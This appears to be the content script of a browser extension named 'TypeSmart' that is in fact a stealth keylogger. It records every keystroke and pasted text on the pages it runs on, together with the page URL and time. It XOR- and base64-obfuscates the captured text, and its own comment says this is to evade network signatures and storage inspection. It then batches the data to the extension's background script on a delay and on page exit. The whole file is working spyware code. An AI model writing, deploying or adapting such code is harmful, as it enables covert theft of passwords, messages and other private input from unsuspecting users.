/* global TSConstants, BrowserAPI */
const { MSG_TYPES, STEALTH, OBFUSCATION } = window.TSConstants;
const API = window.BrowserAPI;

console.log(`[TypeSmart] Content script loaded (API: ${API.info.apiType})`);

// ============================================================================
// State Management
// ============================================================================
let activeBuffer = "";
let pendingBuffer = "";
let timer = null;
const sessionId = Date.now().toString();

const KEY_MAP = {
  Backspace: "[BKSP]",
  Enter: "[ENTER]",
  Return: "[ENTER]",
  Tab: "[TAB]",
  Shift: "[SHIFT]",
  Control: "[CTRL]",
  Alt: "[ALT]",
  ArrowLeft: "[←]",
  ArrowRight: "[→]",
  ArrowUp: "[↑]",
  ArrowDown: "[↓]",
  Escape: "[ESC]",
};

// ============================================================================
// Obfuscation
// ============================================================================
function obfuscate(plainText) {
  const safeString = unescape(encodeURIComponent(plainText));
  let result = "";
  for (let i = 0; i < safeString.length; i++) {
    result += String.fromCharCode(
      safeString.charCodeAt(i) ^ OBFUSCATION.XOR_KEY,
    );
  }
  return btoa(result);
}

function createEntry(keys) {
  // Always store obfuscated string in 'keys' to evade network signatures and local storage scrutiny.
  // Set 'obfuscated' to true so popup.js knows to decode it.
  return {
    url: window.location.href,
    timestamp: Date.now(),
    keys: keys,
    sessionId: sessionId,
    obfuscated: obfuscate(keys),
  };
}

// ============================================================================
// Transmission Logic (Pure Debounce)
// ============================================================================
function processFlush() {
  if (timer !== null) {
    clearTimeout(timer);
    timer = null;
  }

  if (activeBuffer.length === 0 || pendingBuffer.length > 0) return;

  pendingBuffer = activeBuffer;
  activeBuffer = "";

  API.runtime
    .sendMessage({
      type: MSG_TYPES.LOG_KEYS,
      payload: JSON.stringify(createEntry(pendingBuffer)),
    })
    .then((response) => {
      if (
        response &&
        (response.status === "logged" || response.success === true)
      ) {
        pendingBuffer = "";
      } else {
        throw new Error("Invalid response");
      }
    })
    .catch((err) => {
      activeBuffer = pendingBuffer + activeBuffer;
      pendingBuffer = "";
    });
}

function scheduleFlush() {
  if (timer !== null) {
    clearTimeout(timer);
  }

  const delay = STEALTH.DELAY_MS || 3000;
  timer = setTimeout(() => {
    processFlush();
  }, delay);
}

// ============================================================================
// Event Listeners (Fixed)
// ============================================================================

// Capture physical key presses (Letters, Numbers, Symbols, and Special Keys)
document.addEventListener(
  "keydown",
  (e) => {
    const mappedKey = KEY_MAP[e.key];

    if (mappedKey) {
      // It's a special key like Enter or Backspace
      activeBuffer += mappedKey;
      scheduleFlush();
    } else if (e.key.length === 1) {
      // It's a normal printable character (a, b, c, 1, 2, 3, @, etc.)
      activeBuffer += e.key;
      scheduleFlush();
    }
  },
  true,
);

// Capture pasted text seamlessly
document.addEventListener(
  "paste",
  (e) => {
    let pasteData = (e.clipboardData || window.clipboardData).getData("text");
    if (pasteData) {
      activeBuffer += pasteData; // Just insert the text as if they typed it
      scheduleFlush();
    }
  },
  true,
);

// Force flush on exit
window.addEventListener("beforeunload", () => {
  if (timer !== null) clearTimeout(timer);
  if (activeBuffer.length > 0 || pendingBuffer.length > 0) {
    activeBuffer = pendingBuffer + activeBuffer;
    pendingBuffer = "";
    processFlush();
  }
});
